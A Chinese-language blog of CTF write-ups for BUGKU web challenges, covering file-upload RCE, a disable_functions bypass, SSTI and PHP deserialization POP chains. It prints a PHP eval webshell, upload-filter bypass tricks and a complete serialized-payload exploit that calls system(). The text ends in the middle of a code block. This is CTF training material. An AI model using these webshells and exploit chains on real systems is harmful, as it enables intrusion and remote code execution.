<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">print</span>(os.system(<span class="string">&#x27;ls -al&#x27;</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 <code>os</code> 模块，你可以访问操作系统的功能，如文件操作、进程管理、环境变量等。</li>
</ul>
<p>改成jpg或者png格式就会执行</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128173135766.png" alt="image-20241128173135766"></p>
<p>上传后成功了但是并没有看到执行结果，我们用bp抓包试试</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128173236951.png" alt="image-20241128173236951"></p>
<p>有但是不在该目录，我们看一下根目录，直接在bp里面改代码就行</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128173310736.png" alt="image-20241128173310736"></p>
<p>看到了，然后我们修改一下命令</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128173332219.png" alt="image-20241128173332219"></p>
<h2 id="xxx二手交易市场"><a href="#xxx二手交易市场" class="headerlink" title="xxx二手交易市场"></a>xxx二手交易市场</h2><h3 id="文件上传RCE"><a href="#文件上传RCE" class="headerlink" title="#文件上传RCE"></a>#文件上传RCE</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241128173757042.png" alt="image-20241128173757042"></p>
<p>简单看了一下源代码发现没什么可用信息，不过我发现了登录和注册的口子</p>
<p>额，黑盒测试，得一个个慢慢测，在登录注册界面进行sql注入发现不得行，所以这里的话还是一个文件上传，口子在上传头像那里</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128174432109.png" alt="image-20241128174432109"></p>
<p>上传头像然后抓包，这样操作更方便</p>
<p>先是写了一个php一句话木马，但是发现都提交不上去</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128174723382.png" alt="image-20241128174723382"></p>
<p>应该是有前端验证了，那我们改后缀改成jpg或者png格式再上传一次</p>
<p>好吧假造不出来，估计是对文件内容进行了验证</p>
<p>那我们先上传一个正常的图片</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128203028580.png" alt="image-20241128203028580"></p>
<p>这里可以看到我们发现是进行了base64加密的并且这里使用的是data协议来上传，，那我们写个一句话木马，然后进行base64编码</p>
<p><img src="/./../image/achieve/202411/BUGKU/42d440b0ce7108e92c4ae70ac4370adb.png" alt="在这里插入图片描述"></p>
<p>然后把jpeg改成php，让php来作为文件后缀</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128203743086.png" alt="image-20241128203743086"></p>
<p>可以得到一个图片路径，将这个路径去掉\号并与去掉&#x2F;User的原本路径合并起来，让蚁剑进行连接就可以拿到flag了</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="文件上传RCE-1"><a href="#文件上传RCE-1" class="headerlink" title="#文件上传RCE"></a>#文件上传RCE</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241128204146405.png" alt="image-20241128204146405"></p>
<p>指明了不能传php格式，不过我们还是先把我们的一句话木马上传看一下回显</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128204351461.png" alt="image-20241128204351461"></p>
<p>无效文件，那我们改成jpg传看一下</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128204456485.png" alt="image-20241128204456485"></p>
<p>这里可以看到是上传成功了的，说明并没有对文件内容进行一定的检查，那就试一下是不是对其他地方进行了检测</p>
<p>然后我测试半天都没搞明白，就直接看别人的wp了</p>
<p>大佬的wp：</p>
<p>使用burp抓包，不断尝试发现发现需要修改的地方有三个：</p>
<p>一个是http head里的Content-Type: multipart&#x2F;form-data;<br>请求头部的 Content-Type 内容 随便改个大写字母过滤掉 比如 mulTipart&#x2F;form-data （其t为大写）<br>Multipart里的部分字母改成大写的。</p>
<p>第二个是文件的的Content-Type: application&#x2F;octet-stream，改成image&#x2F;jpeg</p>
<p>第三个是文件后缀名改成php4<br>（依次尝试php4，phtml，phtm，phps，php5（包括一些字母改变大小写））分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php4没有被过滤</p>
<ol>
<li>Multipart&#x2F;form-data<ul>
<li>表示请求体是以多部分形式编码的。这种编码方式通常用于表单上传文件或包含文件和其他字段的复杂数据。</li>
</ul>
</li>
</ol>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="绕过disable-function"><a href="#绕过disable-function" class="headerlink" title="#绕过disable_function"></a>#绕过disable_function</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241128212239416.png" alt="image-20241128212239416"></p>
<p>nb，全是编码，php混淆解密，我们直接用网上的解密工具进行解密</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[ymlisisisiook]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到是一句话木马，我们试着连一下</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128213541200.png" alt="image-20241128213541200"></p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128222005854.png" alt="image-20241128222005854"></p>
<p>访问不了emm，应该是要绕过disable_functions，这就得用蚁剑的插件了</p>
<p><img src="/./../image/achieve/202411/BUGKU/f71dc38c4b754549934728d23ebe5af9.png" alt="img"></p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128222432176.png" alt="image-20241128222432176"></p>
<p>点击开始后会生成一个php木马文件，我们连接一下那个木马文件</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128222507466.png" alt="image-20241128222507466"></p>
<p>就可以发现里面的目录都可以访问了</p>
<h2 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h2><h3 id="反序列化基础"><a href="#反序列化基础" class="headerlink" title="#反序列化基础"></a>#反序列化基础</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241128223135671.png" alt="image-20241128223135671"></p>
<p>这道题的话是login点不了</p>
<p>查看源码发现一个admin.css</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128223616330.png" alt="image-20241128223616330"></p>
<p>让我们试一下?8033</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128223646498.png" alt="image-20241128223646498"></p>
<p>拿到源码了</p>
<p>这里的话是需要我们设置一个cookie中的BUGKU值为<code>(s:13:&quot;ctf.bugku.com&quot;;)</code>这样反序列化出来才会是ctf.bugku.com</p>
<p>所以我们抓包并设置cookie值，注意这里不要访问?8033</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128224310295.png" alt="image-20241128224310295"></p>
<h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h2><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="#SSTI"></a>#SSTI</h3><p>很简单的一个ssti注入哈</p>
<p>You need pass in a parameter named flag。提示我们需要传入一个flag参数，我们先查看一下源代码</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128234822499.png" alt="image-20241128234822499"></p>
<p>说明我们这里有一个变量是secret_key，那我们访问一下这个变量</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128235253516.png" alt="image-20241128235253516"></p>
<h2 id="兔年大吉2"><a href="#兔年大吉2" class="headerlink" title="兔年大吉2"></a>兔年大吉2</h2><h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="#php反序列化"></a>#php反序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wishes can be fulfilled&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nevv</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$happiness</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;happiness-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rabbit</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$aspiration</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;aspiration-&gt;family;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Year</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rabbit</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">firecrackers</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;rabbit-&gt;wish = <span class="string">&quot;allkill QAQ&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;rabbit;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key == <span class="string">&quot;happy new year&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">firecrackers</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;Welcome 2023!!!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;过新年啊~过个吉祥年~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> 过新年啊~过个吉祥年~</span><br></pre></td></tr></table></figure>

<p>魔术方法:</p>
<ul>
<li><code>__call</code>: 在对象中调用一个不可访问方法时被调用</li>
<li><code>__invoke</code>： 当一个对象被作为函数调用时被调用</li>
<li><code>__set</code>: 当对象设置一个不存在的属性时调用</li>
<li><code>__get</code>： 当对象访问一个不存在的属性时调用</li>
</ul>
<p>是一道反序列化的题目，那我们先构造pop链</p>
<p>构造pop链，我一般会先找到链子的出口，也就是能造成恶意攻击的地方</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)#在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);<span class="comment">#cmd作为回调函数的函数名，content作为传入函数的参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看到call_user_func()函数就是可以进行恶意rce 的地方，所以他就是我们链子的出口，，找到出口了我们进行倒推，可以看到触发call_user_func()方法的前提是在对象上下文中调用不可访问的方法，那我们找一下这里哪有有调用不可访问或者不存在的方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nevv</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$happiness</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)#当你尝试将一个对象像函数一样调用时触发这个方法</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;happiness-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的话可以看到在这个invoke方法中进行了一个不可访问方法的调用，所以这里会触发我们的call方法，那么我们的pop链就是</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">Nevv</span>::<span class="function"><span class="title">__invoke</span>()-&gt;<span class="variable">Happy</span>::<span class="title">__call</span>()</span></span><br></pre></td></tr></table></figure>

<p>我们继续往前推，为了触发这个invoke方法，我们需要将对象像函数一样调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)#读取不可访问或者是不存在的属性时触发</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;rabbit;</span><br><span class="line">    <span class="variable">$name</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的话其实并不像上面那么明显，但是我们经过排除可以确定是可以通过这个方法去触发invoke方法，为什么呢?因为这个方法里面有$name()，所以如果我们让name的值为一个对象，就可以将对象像函数一样调用，然后就可以触发invoke方法，继续完善我们的pop链</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Year::__get<span class="function"><span class="params">()</span>-&gt;</span>Nevv::__invoke<span class="function"><span class="params">()</span>-&gt;</span>Happy::__call()</span><br></pre></td></tr></table></figure>

<p>继续，为了触发get方法，条件就不赘述了，上面都有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">firecrackers</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;rabbit-&gt;wish = <span class="string">&quot;allkill QAQ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$val</span></span>)</span>&#123;<span class="comment">#将数据写入不可访问或者不存在的属性时触发</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;aspiration-&gt;family;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看到两个方法都是访问了一个不存在的属性，但是我们可以看到在set方法的触发条件是将数据写入一个不可访问的属性，那刚好就是我们fircrackers方法的作用了，所以我们完整的pop链就是</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Year::firecrackers<span class="function"><span class="params">()</span>-&gt;</span>Rabbit::__set<span class="function"><span class="params">()</span>-&gt;</span>Year::__get<span class="function"><span class="params">()</span>-&gt;</span>Nevv::__invoke<span class="function"><span class="params">()</span>-&gt;</span>Happy::__call()</span><br></pre></td></tr></table></figure>

<p>但是因为我们的pop链需要触发的入口，所以我们可以通过destruct或者construct去触发我们的pop链，在Year类里面我们可以看到destruct方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key == <span class="string">&quot;happy new year&quot;</span>) &#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">firecrackers</span>();</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">print</span>(<span class="string">&quot;Welcome 2023!!!!!&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>这里有调用firecrackers方法，所以这个可以作为我们的入口，那么我们完整的pop链就是</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Year::__destruct<span class="function"><span class="params">()</span>-&gt;</span>Year::firecrackers<span class="function"><span class="params">()</span>-&gt;</span>Rabbit::__set<span class="function"><span class="params">()</span>-&gt;</span>Year::__get<span class="function"><span class="params">()</span>-&gt;</span>Nevv::__invoke<span class="function"><span class="params">()</span>-&gt;</span>Happy::__call()</span><br></pre></td></tr></table></figure>

<p>根据pop链构造EXP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nevv</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$happiness</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$happiness</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;happiness=<span class="variable">$happiness</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rabbit</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$aspiration</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$aspiration</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;aspiration=<span class="variable">$aspiration</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Year</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>=<span class="string">&quot;happy new year&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rabbit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Year</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Year</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Rabbit</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title class_">Happy</span>(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;tac /flag&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">Nevv</span>(<span class="variable">$e</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;rabbit=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;rabbit=<span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="unserialize-Noteasy"><a href="#unserialize-Noteasy" class="headerlink" title="unserialize-Noteasy"></a>unserialize-Noteasy</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>.<span class="variable">$b</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$a</span>.<span class="variable">$b</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = (<span class="keyword">string</span>)<span 